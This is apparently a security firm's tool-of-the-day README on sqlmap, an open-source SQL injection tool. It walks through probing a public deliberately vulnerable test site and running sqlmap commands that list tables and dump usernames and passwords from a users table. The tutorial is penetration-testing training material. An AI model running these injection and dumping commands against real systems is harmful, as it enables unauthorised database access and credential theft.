SQLMAP
============

Automatic SQL injection and database takeover tool

![SQLMAP ](https://www.briskinfosec.com/assets/tooloftheday/Copy_of_Briskinfosec_TOD_Latest_samples_178.jpg)


Details:
============
|  Details | Description   |
| ------------ | ------------ |
|  Tool Name |  SQLMAP |
|  Category | Web Application  |
|  Purpose | sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches including database fingerprinting, over data fetching from the database, accessing the underlying file system, and executing commands on the operating system via out-of-band connections.  |
|  License |    Opensource|

Demo Video:
-----------------
Click Here for [Video](https://www.youtube.com/watch?v=RKgO1penBtk  "Video")


Blog: 
--------------
Click Here for [Blog](https://briskinfosec.com/tooloftheday/toolofthedaydetail/SQLMAP "Blog")

Installation
----------------

To install SQLmap we can pull it  from above github link or we can use below command 

- apt-get install sqlmap

It comes installed by default in kali linux...

To use sqlmap to exploit SQLi flaw

1.First we need to find a SQLi vulnerable parameter in a web app

- testphp.vulnweb.com/listproducts.php?cat=2' 

 Adding a single quote showed this site parameter cat is vulnerable 

2.We can launch sqlmap to dump Databases, tables and cloumns and Data from the vulnerable site

Note: Using Sqlmap for exploitation without proper permission is illegal

-  -u url -p parameter
- --dbs databases
- --tables to get tables
- --columns to get columns

Sqlmap may take a lot of time as it will try lot of sqli techniques based on target SQL server (mysql, mssql, oracle etc.,)

Once we got DB, we can fetch tables and columns

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -p cat -D acuart --tables

Lets dump user and pass info from users table

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -p cat -D acuart -T users -C uname,pass --dump

In this way SQLmap can be used to exploit blind SQLi vulnerability also.

------------


Links
----------------

 ![ ](https://img.icons8.com/color/15/000000/youtube-play.png) [Briskinfosec Youtube Channel](https://www.youtube.com/channel/UCcPmqqYETcO_7-6p_uUsF1w "Briskinfosec Youtube Channel")


 ![ ](https://img.icons8.com/glyph-neue/15/000000/github.png) [Github](https://github.com/briskinfosec "Github") 

  ![ ](https://img.icons8.com/ios/15/000000/internet--v2.png) [Our Website](https://www.briskinfosec.com/ "Our Website")
